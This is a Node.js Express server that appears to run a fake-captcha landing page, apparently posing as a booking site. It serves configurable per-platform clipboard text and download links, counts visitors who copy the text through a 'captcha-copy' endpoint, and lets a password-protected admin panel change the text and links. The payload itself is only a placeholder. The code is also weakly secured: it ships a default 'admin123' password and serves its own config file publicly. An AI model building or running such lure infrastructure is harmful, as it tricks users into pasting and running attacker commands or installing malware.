const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const configPath = path.join(__dirname, 'data', 'config.json');

function defaultConfig() {
    return {
        macUrl: '',
        windowsUrl: '',
        macClipboardText: '<темный друн mac>',
        windowsClipboardText: '<темный друн>',
        macCopies: 0,
        windowsCopies: 0,
        adminPassword: 'admin123'
    };
}

function readConfig() {
    if (!fs.existsSync(configPath)) {
        const dir = path.dirname(configPath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const config = defaultConfig();
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return config;
    }
    return JSON.parse(fs.readFileSync(configPath, 'utf8'));
}

function writeConfig(config) {
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

function publicConfig(config) {
    const mac = config.macCopies ?? config.macDownloads ?? 0;
    const win = config.windowsCopies ?? config.windowsDownloads ?? 0;
    return {
        macUrl: config.macUrl || '',
        windowsUrl: config.windowsUrl || '',
        macClipboardText: config.macClipboardText || '<темный друн mac>',
        windowsClipboardText: config.windowsClipboardText || '<темный друн>',
        macCopies: mac,
        windowsCopies: win,
        totalCopies: mac + win
    };
}

function requireAuth(req, res, next) {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

app.use(express.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'booking-landing-dev-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

app.get('/api/config', (req, res) => {
    res.json(publicConfig(readConfig()));
});

app.post('/api/captcha-copy', (req, res) => {
    const platform = req.body.platform;
    if (platform !== 'mac' && platform !== 'windows') {
        return res.status(400).json({ error: 'Invalid platform' });
    }

    const config = readConfig();
    const countKey = platform === 'mac' ? 'macCopies' : 'windowsCopies';
    config[countKey] = (config[countKey] ?? config[platform === 'mac' ? 'macDownloads' : 'windowsDownloads'] ?? 0) + 1;
    writeConfig(config);

    const pub = publicConfig(config);
    res.json({
        platform,
        count: config[countKey],
        totalCopies: pub.totalCopies
    });
});

app.post('/api/download/:platform', (req, res) => {
    const platform = req.params.platform;
    if (platform !== 'mac' && platform !== 'windows') {
        return res.status(400).json({ error: 'Invalid platform' });
    }

    const config = readConfig();
    const urlKey = platform === 'mac' ? 'macUrl' : 'windowsUrl';
    if (!config[urlKey]) {
        return res.status(404).json({ error: 'Download link not configured' });
    }

    res.json({ url: config[urlKey], platform });
});

app.post('/api/login', (req, res) => {
    const config = readConfig();
    if (!req.body.password || req.body.password !== (config.adminPassword || '')) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    req.session.authenticated = true;
    res.json({ success: true });
});

app.post('/api/logout', (req, res) => {
    req.session.destroy(() => {
        res.json({ success: true });
    });
});

app.get('/api/stats', requireAuth, (req, res) => {
    res.json(publicConfig(readConfig()));
});

app.post('/api/save-config', requireAuth, (req, res) => {
    const config = readConfig();
    if (req.body.macUrl !== undefined) config.macUrl = String(req.body.macUrl).trim();
    if (req.body.windowsUrl !== undefined) config.windowsUrl = String(req.body.windowsUrl).trim();
    if (req.body.macClipboardText !== undefined) config.macClipboardText = req.body.macClipboardText;
    if (req.body.windowsClipboardText !== undefined) config.windowsClipboardText = req.body.windowsClipboardText;
    if (req.body.adminPassword) config.adminPassword = String(req.body.adminPassword).trim();
    writeConfig(config);
    res.json({ success: true });
});

app.post('/api/reset-counters', requireAuth, (req, res) => {
    const config = readConfig();
    config.macCopies = 0;
    config.windowsCopies = 0;
    writeConfig(config);
    res.json({ success: true });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.use(express.static(__dirname));

app.listen(PORT, () => {
    console.log('Server running at http://localhost:' + PORT);
});
